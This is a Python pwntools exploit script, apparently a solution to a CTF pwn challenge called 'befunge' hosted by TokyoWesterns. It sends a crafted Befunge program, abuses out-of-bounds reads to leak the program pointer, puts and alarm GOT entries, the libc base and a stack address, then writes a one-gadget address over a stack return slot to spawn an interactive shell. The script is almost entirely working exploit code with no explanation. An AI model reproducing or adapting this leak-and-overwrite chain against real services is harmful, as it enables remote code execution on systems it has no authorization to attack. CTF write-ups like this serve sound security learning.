from pwn import *
p = ""

p += "&&g.&&g.&&g.&&g.&&g.&&g.&&g.&&g.9v@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@v<<<,+<@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>>&&&pv9@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@^vp&&&<1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@>:&[0p1+^>&&&pv^+1,g0:<@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@^+1p0[&:<vp&&&<>:0g,1+^@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@>:&[0p1+^>&&&pv^+1,g0:<@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@^+1p0[&:<vp&&&<>:0g,1+^@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@>:&[0p1+^>&&&pv^+1,g0:<@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@^+1p0[&:<vp&&&<>:0g,1+^@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@>:&[0p1+^&@@@@@^+1,g0:<@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@^+1p0[&:<_>    >:0g,1+^@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
p += "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"

#s = process("./befunge_")
s = remote("pwn1.chal.ctf.westerns.tokyo", 62839)

p = p.replace("[", "\\")
s.sendline(p)

for i in xrange(25):
	s.recvuntil("> ")

y = -2
x = 64

buf = ""
for i in xrange(8):
        s.sendline("%d" % (x+i))
        s.sendline("%d" % y)

        t = int(s.recvuntil(" "))
        if t<0:
                t = 0x100+t
        buf += p8(t)

prgptr = u64(buf)
print "%d %d" % (x,y)
print "[%d] %x, %d" % (y, prgptr, prgptr)

def pushptr(ptr):
	print "Pushing %x" % ptr
	ptr = ptr-prgptr
	if ptr<0:
		ptr = 0x10000000000000000+ptr
	t = p64(ptr)
	for i in xrange(8):
		print "[%d] %d" % (i, ord(t[i]))
		s.sendline("%d" % (ord(t[i])))
		s.sendline("%d" % (i+2016))
		s.sendline("0")

#pushptr(0x4141414142424242)

got_base = prgptr-0x2040+0x1F50

puts = got_base
alarm = got_base+0x18

pushptr(puts)
s.sendline("0")
putsptr = u64(s.recvline()[:-1])

pushptr(alarm)
s.sendline("0")
alarmptr= u64(s.recvline()[:-1])

print "Puts: %x" % (putsptr)
print "Alarm: %x" % (alarmptr)

libc_base = putsptr-0x6FD60
#libc_base = putsptr-0x709D0

stackptrptr = 0x3BF018+libc_base
#stackptrptr = 0x3C54B0+libc_base

pushptr(stackptrptr)
s.sendline("0")

stackptr = u64(s.recvline()[:-1])

pushptr(stackptr)
s.sendline("0")
print s.recvline()

bespoke_gadget = libc_base+0xF16BD
bespoke_gadget = libc_base+0xE66BD

def write(ptr, val):
	pushptr(ptr)
	print "0x%x " % ptr
	s.sendline("1")
	for i in xrange(8):
		s.sendline("%d" % (ord(val[i])))

def read(ptr):
	pushptr(ptr)
	s.sendline("0")
	return (s.recvline())

stackptr = u64(read((u64(read(libc_base+0x3BDFE0)[:-1])))[:-1])

write(stackptr-0xe0, p64(bespoke_gadget))

for j in xrange(0x200):
	write(prgptr, "abcd"*2)
s.interactive()
